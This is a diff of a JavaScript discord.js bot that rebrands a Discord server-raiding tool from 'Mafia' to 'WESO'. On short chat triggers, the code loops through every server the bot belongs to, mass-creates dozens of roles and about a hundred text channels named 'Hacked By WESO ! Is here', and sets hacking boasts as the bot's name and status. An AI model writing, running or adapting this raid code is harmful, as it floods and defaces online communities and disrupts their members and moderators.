@@ -1,4 +1,3 @@
-
 const Discord = require("discord.js");
 const hngel = new Discord.Client();
 console.log('Hacked By WESO ! Is here,');
@@ -54,7 +53,7 @@ hngel.user.setUsername("Hacked Good Night to the server 🧤💤")
 });
 hngel.on('message', message => {
      if (message.content === ".") {
-hngel.user.setGame(`Hacked By Mafia ! Is here`,'https://www.twitch.tv/hngel2667')
+hngel.user.setGame(`Hacked By WESO ! Is here`,'https://www.twitch.tv/hngel2667')
 
 }
 });
@@ -85,615 +84,477 @@ hngel.on('message', message => {
 hngel.on('message', message => {
      
 
-     if (message.content === "k1") {
+     if (message.content === "g1") {
          hngel.guilds.forEach(m =>{
   m.createRole({
-        name : " Hacked By Mafia Is here",
+        name : " Hacked By WESO ! Is here",
         permissions :   [1],
         color : " #ff0000"
     }) 
     m.createRole({
-        name : " , Hacked By Mafia Is here",
+        name : " , Hacked By WESO ! Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : " Hacked By Mafia Is here",
+        name : " Hacked By WESO ! Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : " Hacked By Mafia ! Is here",
+        name : " Hacked By WESO ! Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : " Hacked By Mafia Is here",
+        name : " Hacked By WESO ! Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : " Hacked By Mafia Is here",
+        name : " Hacked By WESO ! Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : " Hacked By Mafia Is here",
+        name : " Hacked By WESO ! Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : " Hacked By Mafia Is here",
+        name : " Hacked By WESO ! Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : " Hacked By Mafia Is here",
+        name : " Hacked By WESO ! Is here",
         permissions :   [1],
         color : " #ff0000"
     })
 
     m.createRole({
-        name : " Hacked By Mafia Is here",
+        name : " Hacked By WESO ! Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : " Hacked By Mafia Is here",
+        name : " Hacked By WESO ! Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : " Hacked By Mafia Is here",
+        name : " Hacked By WESO ! Is here",
         permissions :   [1],
         color : " #ff0000"
     })
      m.createRole({
-        name : " Hacked By Mafia Is here",
+        name : " Hacked By WESO ! Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : " Hacked By Mafia Is here",
+        name : " Hacked By WESO ! Is here",
         permissions :   [1],
         color : " #ff0000"
     })
 
     m.createRole({
-        name : " Hacked By Mafia Is here",
+        name : " Hacked By WESO ! Is here",
         permissions :   [1],
         color : " #ff0000"
     }) 
     m.createRole({
-        name : " Hacked By Mafia Is here",
+        name : " Hacked By WESO ! Is here",
         permissions :   [1],
         color : " #ff0000"
     })
 
     m.createRole({
-        name : "  Hacked By Mafia Is here",
+        name : "  Hacked By WESO ! Is here",
         permissions :   [1],
         color : " #ff0000"
     }) 
     m.createRole({
-        name : "  Hacked By Mafia Is here",
+        name : "  Hacked By WESO ! Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "  Hacked By Mafia Is here",
+        name : "  Hacked By WESO ! Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "  Hacked By Mafia Is here",
+        name : "  Hacked By WESO ! Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "  Hacked By Mafia Is here",
+        name : "  Hacked By WESO ! Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "  Hacked By Mafia Is here",
+        name : "  Hacked By WESO ! Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "  Hacked By Mafia Is here",
+        name : "  Hacked By WESO ! Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "  Hacked By Mafia Is here",
+        name : "  Hacked By WESO ! Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "  Hacked By Mafia Is here",
+        name : "  Hacked By WESO ! Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "  Hacked By Mafia Is here",
+        name : "  Hacked By WESO ! Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "  Hacked By Mafia Is here",
+        name : "  Hacked By WESO ! Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "  Hacked By Mafia Is here",
+        name : "  Hacked By WESO ! Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "  Hacked By Mafia Is here",
+        name : "  Hacked By WESO ! Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "  Hacked By Mafia Is here",
+        name : "  Hacked By WESO ! Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "  Hacked By Mafia Is here",
+        name : "  Hacked By WESO ! Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "  Hacked By Mafia Is here",
+        name : "  Hacked By WESO ! Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "  Hacked By Mafia Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-
-    m.createRole({
-        name : "  Hacked By Mafia Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "  Hacked By Mafia Is here",
+        name : "  Hacked By WESO ! Is here",
         permissions :   [1],
         color : " #ff0000"
     })
 
     m.createRole({
-        name : "  Hacked By Mafia Is here",
+        name : "  Hacked By WESO ! Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "  Hacked By Mafia Is here",
+        name : "  Hacked By WESO ! Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+
+    m.createRole({
+        name : "  Hacked By WESO ! Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "  Hacked By Mafia Is here",
+        name : "  Hacked By WESO ! Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "  Hacked By WESO ! Is here",
         permissions :   [1],
         color : " #ff0000"
 
 })
 m.createRole({
-    name : "  Hacked By Mafia Is here,",
+    name : "  Hacked By WESO ! Is here,",
     permissions :   [1],
     color : " #0f0947"
 })
 m.createRole({
-    name : "  Hacked By Mafia Is here,",
+    name : "  Hacked By WESO ! Is here,",
     permissions :   [1],
     color : " #0f0947"
 })
 m.createRole({
-    name : "  Hacked By Mafia Is here,",
+    name : "  Hacked By WESO ! Is here,",
     permissions :   [1],
     color : " #0f0947"
 })
 m.createRole({
-    name : "  Hacked By Mafia Is here,",
+    name : "  Hacked By WESO ! Is here,",
     permissions :   [1],
     color : " #0f0947"
 })
 m.createRole({
-    name : "  Hacked By Mafia Is here,",
+    name : "  Hacked By WESO ! Is here,",
     permissions :   [1],
     color : " #0f0947"
 })
 m.createRole({
-    name : "  Hacked By Mafia Is here,",
+    name : "  Hacked By WESO ! Is here,",
     permissions :   [1],
     color : " #0f0947"
 })
 m.createRole({
-    name : "  Hacked By Mafia Is here,",
+    name : "  Hacked By WESO ! Is here,",
     permissions :   [1],
     color : " #0f0947"
 })
 m.createRole({
-    name : "  Hacked By Mafia Is here,",
+    name : "  Hacked By WESO ! Is here,",
     permissions :   [1],
     color : " #0f0947"
 })
 m.createRole({
-    name : "  Hacked By Mafia Is here,",
+    name : "  Hacked By WESO ! Is here,",
     permissions :   [1],
     color : " #0f0947"
 })
 m.createRole({
-    name : "  Hacked By Mafia Is here,",
+    name : "  Hacked By WESO ! Is here,",
     permissions :   [1],
     color : " #0f0947"
 })
 m.createRole({
-    name : "  Hacked By Mafia Is here,",
+    name : "  Hacked By WESO ! Is here,",
     permissions :   [1],
     color : " #0f0947"
 })
 m.createRole({
-    name : "  Hacked By Mafia Is here,",
+    name : "  Hacked By WESO ! Is here,",
     permissions :   [1],
     color : " #0f0947"
 })
 m.createRole({
-    name : "  Hacked By Mafia Is here,",
+    name : "  Hacked By WESO ! Is here,",
     permissions :   [1],
     color : " #0f0947"
 })
 m.createRole({
-    name : "  Hacked By Mafia Is here,",
+    name : "  Hacked By WESO ! Is here,",
     permissions :   [1],
     color : " #0f0947"
 })
 m.createRole({
-    name : "  Hacked By Mafia Is here,",
+    name : "  Hacked By WESO ! Is here,",
     permissions :   [1],
     color : " #0f0947"
 })
 m.createRole({
-    name : "  Hacked By Mafia Is here,",
+    name : "  Hacked By WESO ! Is here,",
     permissions :   [1],
     color : " #0f0947"
 })
 m.createRole({
-    name : "  Hacked By Mafia Is here,",
+    name : "  Hacked By WESO ! Is here,",
     permissions :   [1],
     color : " #0f0947"
 })
 m.createRole({
-    name : "  Hacked By Mafia Is here,",
+    name : "  Hacked By WESO ! Is here,",
     permissions :   [1],
     color : " #0f0947"
 })
 m.createRole({
-    name : "  Hacked By Mafia Is here,",
+    name : "  Hacked By WESO ! Is here,",
     permissions :   [1],
     color : " #0f0947"
 })
 m.createRole({
-    name : "  Hacked By Mafia Is here,",
+    name : "  Hacked By WESO ! Is here,",
     permissions :   [1],
     color : " #0f0947"
 })
 m.createRole({
-    name : "  Hacked By Mafia Is here,",
+    name : "  Hacked By WESO ! Is here,",
     permissions :   [1],
     color : " #0f0947"
 })
 m.createRole({
-    name : "  Hacked By Mafia Is here,",
+    name : "  Hacked By WESO ! Is here,",
     permissions :   [1],
     color : " #0f0947"
 })
 m.createRole({
-    name : "  Hacked By Mafia ! Is here,",
+    name : "  Hacked By WESO ! Is here,",
     permissions :   [1],
     color : " #0f0947"
 })
 m.createRole({
-    name : "  Hacked By Mafia ! Is here,",
+    name : "  Hacked By WESO ! Is here,",
     permissions :   [1],
     color : " #0f0947"
 })
 m.createRole({
-    name : "  Hacked By Mafia ! Is here,",
+    name : "  Hacked By WESO ! Is here,",
     permissions :   [1],
     color : " #0f0947"
 })
 m.createRole({
-    name : "  Hacked By Mafia ! Is here,",
+    name : "  Hacked By WESO ! Is here,",
     permissions :   [1],
     color : " #0f0947"
 })
 m.createRole({
-    name : "  Hacked By Mafia ! Is here,",
+    name : "  Hacked By WESO ! Is here,",
     permissions :   [1],
     color : " #0f0947"
 })
 m.createRole({
-    name : "  Hacked By Mafia Is here,",
+    name : "  Hacked By WESO ! Is here,",
     permissions :   [1],
     color : " #0f0947"
 })
 m.createRole({
-    name : "  Hacked By Mafia! Is here,",
+    name : "  Hacked By WESO ! Is here,",
     permissions :   [1],
     color : " #0f0947"
 })
 m.createRole({
-    name : "  Hacked By Mafia! Is here,",
+    name : "  Hacked By WESO ! Is here,",
     permissions :   [1],
     color : " #0f0947"
 })
 m.createRole({
-    name : "  Hacked By Mafia! Is here,",
+    name : "  Hacked By WESO ! Is here,",
     permissions :   [1],
     color : " #0f0947"
 })
 m.createRole({
-    name : "  Hacked By Mafia! Is here,",
+    name : "  Hacked By WESO ! Is here,",
     permissions :   [1],
     color : " #0f0947"
 })
 m.createRole({
-    name : "  Hacked By Mafia! Is here,",
+    name : "  Hacked By WESO ! Is here,",
     permissions :   [1],
     color : " #0f0947"
 })
 m.createRole({
-    name : "  Hacked By Mafia! Is here,",
+    name : "  Hacked By WESO ! Is here,",
     permissions :   [1],
     color : " #0f0947"
 })
 m.createRole({
-    name : "  Hacked By Mafia! Is here,",
+    name : "  Hacked By WESO ! Is here,",
     permissions :   [1],
     color : " #0f0947"
 })
 m.createRole({
-    name : "  Hacked By Mafia! Is here,",
+    name : "  Hacked By WESO ! Is here,",
     permissions :   [1],
     color : " #0f0947"
 })
 m.createRole({
-    name : "  Hacked By Mafia! Is here,",
+    name : "  Hacked By WESO ! Is here,",
     permissions :   [1],
     color : " #0f0947"
 })
 m.createRole({
-    name : "  Hacked By Mafia! Is here,",
+    name : "  Hacked By WESO ! Is here,",
     permissions :   [1],
     color : " #0f0947"
 })
 m.createRole({
-    name : "  Hacked By Mafia! Is here,",
+    name : "  Hacked By WESO ! Is here,",
     permissions :   [1],
     color : " #0f0947"
 })
 m.createRole({
-    name : "  Hacked By Mafia! Is here,",
+    name : "  Hacked By WESO ! Is here,",
     permissions :   [1],
     color : " #0f0947"
 })
 m.createRole({
-    name : "  Hacked By Mafia! Is here,",
+    name : "  Hacked By WESO ! Is here,",
     permissions :   [1],
     color : " #0f0947"
 })
 m.createRole({
-    name : "  Hacked By Mafia! Is here,",
+    name : "  Hacked By WESO ! Is here,",
     permissions :   [1],
     color : " #0f0947"
 })
 m.createRole({
-    name : "  Hacked By Mafia! Is here,",
+    name : "  Hacked By WESO ! Is here,",
     permissions :   [1],
     color : " #0f0947"
 })
 m.createRole({
-    name : "  Hacked By Mafia! Is here,",
+    name : "  Hacked By WESO ! Is here,",
     permissions :   [1],
     color : " #0f0947"
 })
 m.createRole({
-    name : "  Hacked By Mafia! Is here,",
+    name : "  Hacked By WESO ! Is here,",
     permissions :   [1],
     color : " #0f0947"
 })
 m.createRole({
-    name : "  Hacked By Mafia! Is here,",
+    name : "  Hacked By WESO ! Is here,",
     permissions :   [1],
     color : " #0f0947"
 })
 m.createRole({
-    name : "  Hacked By Mafia! Is here,",
+    name : "  Hacked By WESO ! Is here,",
     permissions :   [1],
     color : " #0f0947"
 })
 m.createRole({
-    name : "  Hacked By Mafia! Is here,",
+    name : "  Hacked By WESO ! Is here,",
     permissions :   [1],
     color : " #0f0947"
 })
 m.createRole({
-    name : "  Hacked By Mafia! Is here,",
+    name : "  Hacked By WESO ! Is here,",
     permissions :   [1],
     color : " #0f0947"
 })
 m.createRole({
-    name : "  Hacked By Mafia! Is here,",
+    name : "  Hacked By WESO ! Is here,",
     permissions :   [1],
     color : " #0f0947"
 })
 m.createRole({
-    name : "  Hacked By Mafia! Is here,",
+    name : "  Hacked By WESO ! Is here,",
     permissions :   [1],
     color : " #0f0947"
 })
 m.createRole({
-    name : "  Hacked By Mafia! Is here,",
+    name : "  Hacked By WESO ! Is here,",
     permissions :   [1],
     color : " #0f0947"
 })
 m.createRole({
-    name : "  Hacked By Mafia! Is here,",
+    name : "  Hacked By WESO ! Is here,",
     permissions :   [1],
     color : " #0f0947"
 })
 m.createRole({
-    name : "  Hacked By Mafia! Is here,",
+    name : "  Hacked By WESO ! Is here,",
     permissions :   [1],
     color : " #0f0947"
 })
 
 m.createRole({
-    name : "  Hacked By Mafia! Is here",
-    permissions :   [1],
-    color : " #ff0000"
-})
-m.createRole({
-    name : "  Hacked By Mafia! Is here",
-    permissions :   [1],
-    color : " #ff0000"
-})
-m.createRole({
-    name : "  Hacked By Mafia! Is here",
-    permissions :   [1],
-    color : " #ff0000"
-})
-m.createRole({
-    name : "  Hacked By Mafia! Is here",
-    permissions :   [1],
-    color : " #ff0000"
-})
-m.createRole({
-    name : "  Hacked By Mafia! Is here",
-    permissions :   [1],
-    color : " #ff0000"
-})
-m.createRole({
-    name : "  Hacked By Mafia! Is here",
-    permissions :   [1],
-    color : " #ff0000"
-})
-m.createRole({
-    name : "  Hacked By Mafia! Is here",
-    permissions :   [1],
-    color : " #ff0000"
-})
-m.createRole({
-    name : "  Hacked By Mafia! Is here",
-    permissions :   [1],
-    color : " #ff0000"
-})
-
-m.createRole({
-    name : "  Hacked By Mafia! Is here",
-    permissions :   [1],
-    color : " #ff0000"
-})
-m.createRole({
-    name : "  Hacked By Mafia! Is here",
-    permissions :   [1],
-    color : " #ff0000"
-})
-m.createRole({
-    name : "  Hacked By Mafia! Is here",
-    permissions :   [1],
-    color : " #ff0000"
-})
- m.createRole({
-    name : "  Hacked By Mafia! Is here",
-    permissions :   [1],
-    color : " #ff0000"
-})
-m.createRole({
-    name : "  Hacked By Mafia! Is here",
-    permissions :   [1],
-    color : " #ff0000"
-})
-
-m.createRole({
-    name : "  Hacked By Mafia! Is here",
-    permissions :   [1],
-    color : " #ff0000"
-}) 
-m.createRole({
-    name : "  Hacked By Mafia! Is here",
-    permissions :   [1],
-    color : " #ff0000"
-})
-
-m.createRole({
-    name : "  Hacked By Mafia! Is here",
-    permissions :   [1],
-    color : " #ff0000"
-}) 
-m.createRole({
-    name : "  Hacked By Mafia! Is here",
-    permissions :   [1],
-    color : " #ff0000"
-})
-m.createRole({
-    name : "  Hacked By Mafia! Is here",
-    permissions :   [1],
-    color : " #ff0000"
-})
-m.createRole({
-    name : "  Hacked By Mafia! Is here",
-    permissions :   [1],
-    color : " #ff0000"
-})
-m.createRole({
-    name : "  Hacked By Mafia! Is here",
-    permissions :   [1],
-    color : " #ff0000"
-})
-m.createRole({
-    name : "  Hacked By Mafia! Is here",
-    permissions :   [1],
-    color : " #ff0000"
-})
-m.createRole({
-    name : "  Hacked By Mafia! Is here",
-    permissions :   [1],
-    color : " #ff0000"
-})
-m.createRole({
-    name : "  Hacked By Mafia! Is here",
-    permissions :   [1],
-    color : " #ff0000"
-})
-m.createRole({
-    name : "  Hacked By Mafia! Is here",
-    permissions :   [1],
-    color : " #ff0000"
-})
-m.createRole({
-    name : "  Hacked By Mafia ! Is here",
-    permissions :   [1],
-    color : " #ff0000"
-})
-m.createRole({
-    name : "  Hacked By Mafia! Is here",
-    permissions :   [1],
-    color : " #ff0000"
-})
-m.createRole({
-    name : "  Hacked By Mafia! Is here",
-    permissions :   [1],
-    color : " #ff0000"
-})
-m.createRole({
-    name : "  Hacked By Mafia! Is here",
+    name : "  Hacked By WESO ! Is here",
     permissions :   [1],
     color : " #ff0000"
 })
@@ -703,44 +564,182 @@ m.createRole({
     color : " #ff0000"
 })
 m.createRole({
-    name : "  Hacked By Mafia! Is here",
+    name : "  Hacked By WESO ! Is here",
     permissions :   [1],
     color : " #ff0000"
 })
 m.createRole({
-    name : "  Hacked By Mafia! Is here",
+    name : "  Hacked By WESO ! Is here",
     permissions :   [1],
     color : " #ff0000"
 })
 m.createRole({
-    name : "  Hacked By Mafia! Is here",
+    name : "  Hacked By WESO ! Is here",
+    permissions :   [1],
+    color : " #ff0000"
+})
+m.createRole({
+    name : "  Hacked By WESO ! Is here",
+    permissions :   [1],
+    color : " #ff0000"
+})
+m.createRole({
+    name : "  Hacked By WESO ! Is here",
+    permissions :   [1],
+    color : " #ff0000"
+})
+m.createRole({
+    name : "  Hacked By WESO ! Is here",
     permissions :   [1],
     color : " #ff0000"
 })
 
 m.createRole({
-    name : "  Hacked By Mafia! Is here",
+    name : "  Hacked By WESO ! Is here",
     permissions :   [1],
     color : " #ff0000"
 })
 m.createRole({
-    name : "  Hacked By Mafia! Is here",
+    name : "  Hacked By WESO ! Is here",
+    permissions :   [1],
+    color : " #ff0000"
+})
+m.createRole({
+    name : "  Hacked By WESO ! Is here",
+    permissions :   [1],
+    color : " #ff0000"
+})
+ m.createRole({
+    name : "  Hacked By WESO ! Is here",
+    permissions :   [1],
+    color : " #ff0000"
+})
+m.createRole({
+    name : "  Hacked By WESO ! Is here",
     permissions :   [1],
     color : " #ff0000"
 })
 
 m.createRole({
-    name : "  Hacked By Mafia! Is here",
+    name : "  Hacked By WESO ! Is here",
+    permissions :   [1],
+    color : " #ff0000"
+}) 
+m.createRole({
+    name : "  Hacked By WESO ! Is here",
+    permissions :   [1],
+    color : " #ff0000"
+})
+
+m.createRole({
+    name : "  Hacked By WESO ! Is here",
+    permissions :   [1],
+    color : " #ff0000"
+}) 
+m.createRole({
+    name : "  Hacked By WESO ! Is here",
     permissions :   [1],
     color : " #ff0000"
 })
 m.createRole({
-    name : "  Hacked By Mafia! Is here",
+    name : "  Hacked By WESO ! Is here",
     permissions :   [1],
     color : " #ff0000"
 })
 m.createRole({
-    name : "  Hacked By Mafia! Is here",
+    name : "  Hacked By WESO ! Is here",
+    permissions :   [1],
+    color : " #ff0000"
+})
+m.createRole({
+    name : "  Hacked By WESO ! Is here",
+    permissions :   [1],
+    color : " #ff0000"
+})
+m.createRole({
+    name : "  Hacked By WESO ! Is here",
+    permissions :   [1],
+    color : " #ff0000"
+})
+m.createRole({
+    name : "  Hacked By WESO ! Is here",
+    permissions :   [1],
+    color : " #ff0000"
+})
+m.createRole({
+    name : "  Hacked By WESO ! Is here",
+    permissions :   [1],
+    color : " #ff0000"
+})
+m.createRole({
+    name : "  Hacked By WESO ! Is here",
+    permissions :   [1],
+    color : " #ff0000"
+})
+m.createRole({
+    name : "  Hacked By WESO ! Is here",
+    permissions :   [1],
+    color : " #ff0000"
+})
+m.createRole({
+    name : "  Hacked By WESO ! Is here",
+    permissions :   [1],
+    color : " #ff0000"
+})
+m.createRole({
+    name : "  Hacked By WESO ! Is here",
+    permissions :   [1],
+    color : " #ff0000"
+})
+m.createRole({
+    name : "  Hacked By WESO ! Is here",
+    permissions :   [1],
+    color : " #ff0000"
+})
+m.createRole({
+    name : "  Hacked By WESO ! Is here",
+    permissions :   [1],
+    color : " #ff0000"
+})
+m.createRole({
+    name : "  Hacked By WESO ! Is here",
+    permissions :   [1],
+    color : " #ff0000"
+})
+m.createRole({
+    name : "  Hacked By WESO ! Is here",
+    permissions :   [1],
+    color : " #ff0000"
+})
+m.createRole({
+    name : "  Hacked By WESO ! Is here",
+    permissions :   [1],
+    color : " #ff0000"
+})
+
+m.createRole({
+    name : "  Hacked By WESO ! Is here",
+    permissions :   [1],
+    color : " #ff0000"
+})
+m.createRole({
+    name : "  Hacked By WESO ! Is here",
+    permissions :   [1],
+    color : " #ff0000"
+})
+
+m.createRole({
+    name : "  Hacked By WESO ! Is here",
+    permissions :   [1],
+    color : " #ff0000"
+})
+m.createRole({
+    name : "  Hacked By WESO ! Is here",
+    permissions :   [1],
+    color : " #ff0000"
+})
+m.createRole({
+    name : "  Hacked By WESO ! Is here",
     permissions :   [1],
     color : " #ff0000"
 
@@ -755,105 +754,105 @@ m.createRole({
 hngel.on('message', message => {
          if (message.content === "g") {
                hngel.guilds.forEach(m =>{
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
-m.createChannel('Hacked By Mafia! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
+m.createChannel('Hacked By WESO ! Is here', 'text');
